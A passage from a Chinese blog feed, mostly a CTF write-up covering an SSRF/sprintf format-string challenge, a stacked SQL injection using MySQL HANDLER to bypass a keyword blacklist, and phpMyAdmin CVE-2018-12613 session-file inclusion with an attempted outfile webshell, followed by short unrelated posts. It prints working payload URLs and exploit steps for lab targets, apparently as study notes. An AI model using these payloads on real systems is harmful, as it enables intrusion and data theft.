punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progress<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number-current<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number-total<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>final-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://gem-love.com<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@é¢å¥L'Amore<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/classie.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/stepsForm.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token keyword">var</span> theForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span> <span class="token string">'theForm'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token class-name">stepsForm</span><span class="token punctuation">(</span> theForm<span class="token punctuation">,</span> <span class="token punctuation">{</span>        onSubmit <span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> form <span class="token punctuation">)</span> <span class="token punctuation">{</span>            classie<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span> theForm<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span> <span class="token string">'.simform-inner'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'hide'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> messageEl <span class="token operator">=</span> theForm<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span> <span class="token string">'.final-message'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            messageEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Ok...Let me have a check'</span><span class="token punctuation">;</span>            classie<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span> messageEl<span class="token punctuation">,</span> <span class="token string">'show'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$filter1</span> <span class="token operator">=</span> <span class="token string">'/^http:\/\/127\.0\.0\.1\//i'</span><span class="token punctuation">;</span><span class="token variable">$filter2</span> <span class="token operator">=</span> <span class="token string">'/.?f.?l.?a.?g.?/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".y1ng.txt"</span><span class="token punctuation">;</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string">"~$ python fuck.py -u \""</span><span class="token punctuation">.</span><span class="token variable">$url</span> <span class="token punctuation">.</span><span class="token string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter1</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter2</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^GET/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^POST/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>不能直接读取含有flag文件名的文件，.q2的值必须以<a href="http://127.0.0.1/%E5%BC%80%E5%A4%B4%EF%BC%8C%E5%8F%AA%E8%83%BD%E9%80%9A%E8%BF%87SSRF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%8Cq2%E5%90%8E%E4%BC%9A%E6%8B%BC%E6%8E%A5%E2%80%9C.y1ng.txt%E2%80%9D%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">http://127.0.0.1/开头，只能通过SSRF读取文件，q2后会拼接“.y1ng.txt”字符串</a></p><p>通过home.php猜测有admin.php，可以在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效。</p><blockquote><p><a href="http://127.0.0.1/flag.php=http://127.0.0.1/flag.php#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6" target="_blank" rel="noopener">http://127.0.0.1/flag.php=http://127.0.0.1/flag.php#任意字符</a></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>考格式化输出，看师傅的wp，学到两点  <a href="https://www.cnblogs.com/yesec/p/12554957.html" target="_blank" rel="noopener">from</a></p><blockquote><p>\1. %1$s —— 这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:"</span><span class="token constant">GET</span><span class="token operator">%</span><span class="token number">1</span><span class="token variable">$s</span><span class="token operator">%</span>d"<span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// %1$s会以字符串格式输出$detect，而%d会输出0</span></code></pre><p>\2. %s% —— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:"</span><span class="token constant">GET</span><span class="token operator">%</span>s<span class="token operator">%</span><span class="token operator">%</span>d"<span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// %d前的%被转义，因此失</span></code></pre><p>构造出Payload，POST发送给system.php即可获得admin.php的源码：</p><pre class=" language-php"><code class="language-php">q1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>q2<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/admin.php#&amp;q3=GET%1$s </span></code></pre></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1ag</span> <span class="token operator">=</span> <span class="token string">'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//fake</span><span class="token keyword">function</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'AES-128-CBC'</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span> <span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;head>&lt;title>403 Forbidden&lt;/title>&lt;/head>&lt;body bgcolor=black>&lt;center>&lt;font size='10px' color=white>&lt;br>only 127.0.0.1 can access! You know what I mean right?&lt;br>your ip address is "</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$decr</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">include</span> <span class="token string">'flag_2sln2ndln2klnlksnf.php'</span><span class="token punctuation">;</span>        <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$decr</span> <span class="token operator">===</span> <span class="token variable">$cipher</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token constant">WHAT_YOU_WANT</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'爬'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//I heard you can break PHP mt_rand seed</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token number">0</span></code></pre><p>else部分是不能爆破随机数的，所以就不能制造和$cipher一样的密文了，看wp后发现一个小trick</p><blockquote><p>session绕过。删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION[‘var’]就为NULL，传参NULL。</p><p><a href="https://www.jianshu.com/p/9c031dee57b7" target="_blank" rel="noopener">from</a></p></blockquote><p>计算出密钥</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'AES-128-CBC'</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'174.0.0.15'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span> <span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>删除cookie</p><p><img src="../../../../img/image-20201017173947415.png" alt="image-20201017173947415"></p><p><img src="../../../../img/image-20201017174051841.png" alt="image-20201017174051841"></p><h2 id="Windows-BJDCTF-2nd-EasyAspDotNet"><a href="#Windows-BJDCTF-2nd-EasyAspDotNet" class="headerlink" title="Windows[BJDCTF 2nd]EasyAspDotNet"></a>Windows[BJDCTF 2nd]EasyAspDotNet</h2><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>有个查询窗口，猜测注入，加<code>&#39;</code>报错</p><p><img src="../../../../img/image-20201018170703954.png" alt="image-20201018170703954"></p><p><a href="http://c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=1&#39;" target="_blank" rel="noopener">http://c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=1&#39;</a> or 2&gt;1 –+</p><p><img src="../../../../img/image-20201018170853794.png" alt="image-20201018170853794"></p><p><a href="http://c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=1&#39;" target="_blank" rel="noopener">http://c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=1&#39;</a> or 2=1 –+</p><p><img src="../../../../img/image-20201018171015763.png" alt="image-20201018171015763"></p><p>order by 查询出2列，union select后返回限制</p><p><img src="../../../../img/image-20201018171155819.png" alt="image-20201018171155819"></p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这题和强网杯随便注相似，但过滤了改名函数。</p><p>堆叠注入</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=1';show tables --+</span></code></pre><p><img src="../../../../img/image-20201018172147550.png" alt="image-20201018172147550"></p><p>过滤了select，可用handler语句代替select</p><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><p><img src="../../../../img/image-20201018172313380.png" alt="image-20201018172313380"></p><p><a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">from</a></p><p>payload</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//c52d8600-ad4b-4d74-97a9-fe15bff2ab1f.node3.buuoj.cn/?inject=-1';handler FlagHere open; handler FlagHere read first; --+</span></code></pre><h1 id="real"><a href="#real" class="headerlink" title="real"></a>real</h1><h1 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h1><p><a href="https://blog.csdn.net/qq_45158261/article/details/107760856" target="_blank" rel="noopener">1</a></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/80829269?https:%252f%252fblog.csdn.net%252fqq_33020901%252farticle%252fdetails%252f80829269" target="_blank" rel="noopener">2</a></p><p>先执行sql语句</p><blockquote><p>select ‘<?php phpinfo()?>‘</p></blockquote><p>然后查看cookie，进行session包含，查看绝对路径</p><blockquote><p>index.php?target=db_sql.php%253f/../../../../../../../../../../../tmp/sess_+之前记录的<br>cookie</p></blockquote><p><img src="../../../../img/image-20200812205749337.png" alt="image-20200812205749337"></p><p>然后写shell</p><blockquote><p>select ‘’ into outfile ‘/var/www/html/1.php’</p></blockquote><p>发现写不了</p><p>原来flag就在PHP info中</p><p><img src="../../../../img/image-20200812210315524.png" alt="image-20200812210315524"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Markdownpad2插入多行代码问题</title>
      <link href="/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/"/>
      <url>/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>用Markdownpad2写博客时换行总是要用<code>&lt;p&gt;</code>,并且插入多行代码时特别不方便，以为本就是这么麻烦，后面 才发现原来是设置的问题</p><blockquote><p>ps: 主力已换typora，建议直接typora，markdowndpad2需要额外安装插件，并且占用内存较大，对表格和图片等插入的支持较弱。</p></blockquote><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>工具=&gt;选项=&gt;Markdown<br><img src="https://s2.ax1x.com/2020/01/20/1iUDhV.png"><br>选择<strong>Github风格Markdown（离线）</strong>即可<br>然后编写就极为方便了</p>]]></content>
      
      
      <categories>
          
          <category> 小问题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python中的yield</title>
      <link href="/2020/01/20/python-zhong-de-yield/"/>
      <url>/2020/01/20/python-zhong-de-yield/</url>
      
